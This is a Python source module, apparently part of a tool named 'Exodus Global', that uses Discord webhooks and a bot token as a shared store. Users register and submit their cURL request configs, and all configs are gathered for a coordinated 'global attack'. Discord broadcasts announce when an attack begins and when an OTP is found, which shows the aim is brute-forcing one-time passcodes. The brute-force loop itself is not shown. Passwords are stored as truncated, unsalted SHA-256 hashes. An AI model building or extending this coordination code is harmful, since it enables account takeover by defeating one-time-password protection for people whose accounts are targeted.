"""
Global Attack Module
Uses Discord as a shared database for collaborative multi-user attacks.
Users register/login, bind their cURL, and all users attack together.
"""

import requests
import json
import os
import hashlib
import time
from datetime import datetime
from ui import font

# Config paths
CONFIG_DIR = os.path.join(os.getcwd(), 'Input')
GLOBAL_CONFIG_PATH = os.path.join(CONFIG_DIR, 'global_config.json')

def ensure_config_dir():
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)

def hash_password(password):
    """Simple password hashing"""
    return hashlib.sha256(password.encode()).hexdigest()[:16]

def load_global_config():
    """Load local global config (webhook URL and user session)"""
    if os.path.exists(GLOBAL_CONFIG_PATH):
        try:
            with open(GLOBAL_CONFIG_PATH, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return None

def save_global_config(config):
    """Save global config locally"""
    ensure_config_dir()
    with open(GLOBAL_CONFIG_PATH, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2)

def send_webhook(webhook_url, content=None, embed=None):
    """Send message to Discord webhook"""
    payload = {}
    if content:
        payload['content'] = content
    if embed:
        payload['embeds'] = [embed]
    
    try:
        response = requests.post(webhook_url, json=payload)
        return response.status_code in [200, 204], response
    except Exception as e:
        return False, str(e)

def register_user(data_webhook_url, username, password, curl_data, notify_webhook_url=None):
    """
    Register a new user to the global database.
    Data is stored as a special formatted message in Discord.
    
    Args:
        data_webhook_url: Webhook for storing user data (private channel)
        username: User's username
        password: User's password
        curl_data: User's cURL config
        notify_webhook_url: Optional webhook for notifications (public channel)
    """
    password_hash = hash_password(password)
    
    # Create user data packet
    user_data = {
        "username": username,
        "password_hash": password_hash,
        "curl_data": curl_data,
        "registered": datetime.now().isoformat()
    }
    
    # Encode as JSON and wrap in markers
    encoded_data = json.dumps(user_data)
    
    # Send the actual data in parseable format (to DATA channel only)
    data_message = f"```[EXODUS_GLOBAL_USER]\n{encoded_data}\n[/EXODUS_GLOBAL_USER]```"
    success, _ = send_webhook(data_webhook_url, data_message)
    
    # Send notification to public channel if provided
    if notify_webhook_url:
        embed = {
            "title": "👤 New User Joined",
            "description": f"**{username}** joined Exodus Global!",
            "color": 5763719,
            "timestamp": datetime.now().isoformat(),
            "footer": {"text": "Exodus Global Network"}
        }
        send_webhook(notify_webhook_url, None, embed)
    
    return success

def update_user_curl(data_webhook_url, username, password, new_curl, notify_webhook_url=None):
    """Update an existing user's cURL data
    
    Args:
        data_webhook_url: Webhook for storing user data (private channel)
        username: User's username
        password: User's password
        new_curl: New cURL config
        notify_webhook_url: Optional webhook for notifications (public channel)
    """
    password_hash = hash_password(password)
    
    user_data = {
        "username": username,
        "password_hash": password_hash,
        "curl_data": new_curl,
        "updated": datetime.now().isoformat()
    }
    
    encoded_data = json.dumps(user_data)
    
    # Send data to private channel only
    data_message = f"```[EXODUS_GLOBAL_USER]\n{encoded_data}\n[/EXODUS_GLOBAL_USER]```"
    success, _ = send_webhook(data_webhook_url, data_message)
    
    # Optional notification to public channel
    if notify_webhook_url:
        embed = {
            "title": "🔄 User Updated",
            "description": f"**{username}** refreshed their config",
            "color": 3447003,
            "timestamp": datetime.now().isoformat()
        }
        send_webhook(notify_webhook_url, None, embed)
    
    return success

def fetch_channel_messages(channel_id, bot_token):
    """
    Fetch messages from Discord channel using bot token.
    This requires a bot token with read message permissions.
    """
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=100"
    headers = {
        "Authorization": f"Bot {bot_token}"
    }
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return response.json(), None
        else:
            return None, f"HTTP {response.status_code}: {response.text}"
    except Exception as e:
        return None, str(e)

def parse_users_from_messages(messages):
    """Parse user data from Discord messages"""
    users = {}
    
    for msg in messages:
        content = msg.get('content', '')
        
        # Look for our data markers
        if '[EXODUS_GLOBAL_USER]' in content and '[/EXODUS_GLOBAL_USER]' in content:
            try:
                # Extract JSON data
                start = content.find('[EXODUS_GLOBAL_USER]') + len('[EXODUS_GLOBAL_USER]')
                end = content.find('[/EXODUS_GLOBAL_USER]')
                json_str = content[start:end].strip()
                
                # Remove code block markers if present
                json_str = json_str.replace('```', '').strip()
                
                user_data = json.loads(json_str)
                username = user_data.get('username')
                
                if username:
                    # Keep only the most recent entry per user (first found = newest)
                    if username not in users:
                        users[username] = user_data
                        
            except json.JSONDecodeError:
                continue
    
    return users

def authenticate_user(users_dict, username, password):
    """Check if username/password matches stored data"""
    password_hash = hash_password(password)
    
    if username in users_dict:
        stored_hash = users_dict[username].get('password_hash')
        if stored_hash == password_hash:
            return True, users_dict[username]
    
    return False, None

def get_all_user_curls(users_dict):
    """Extract all cURL configs from users for attack"""
    curls = []
    
    for username, data in users_dict.items():
        curl_data = data.get('curl_data')
        if curl_data:
            curls.append({
                'username': username,
                'curl': curl_data
            })
    
    return curls

def send_attack_notification(webhook_url, initiator, user_count):
    """Notify Discord that an attack is starting"""
    embed = {
        "title": "⚔️ GLOBAL ATTACK INITIATED",
        "description": f"**{initiator}** started a global attack!",
        "color": 15158332,  # Red
        "fields": [
            {
                "name": "Users Participating",
                "value": str(user_count),
                "inline": True
            },
            {
                "name": "Time",
                "value": datetime.now().strftime("%H:%M:%S"),
                "inline": True
            }
        ],
        "footer": {"text": "Exodus Global Network"}
    }
    
    return send_webhook(webhook_url, "@everyone Global Attack Started!", embed)

def send_otp_found_notification(webhook_url, otp, found_by):
    """Notify Discord that OTP was found"""
    embed = {
        "title": "🎉 OTP FOUND - GLOBAL SUCCESS!",
        "description": "The OTP has been discovered!",
        "color": 5763719,  # Green
        "fields": [
            {
                "name": "OTP",
                "value": f"**`{otp}`**",
                "inline": True
            },
            {
                "name": "Found By",
                "value": found_by,
                "inline": True
            }
        ],
        "footer": {"text": "Exodus Global Network"}
    }
    
    return send_webhook(webhook_url, "@everyone OTP Found!", embed)

def test_bot_connection(channel_id, bot_token):
    """Test if bot can access the channel"""
    messages, error = fetch_channel_messages(channel_id, bot_token)
    if error:
        return False, error
    return True, f"Found {len(messages)} messages"
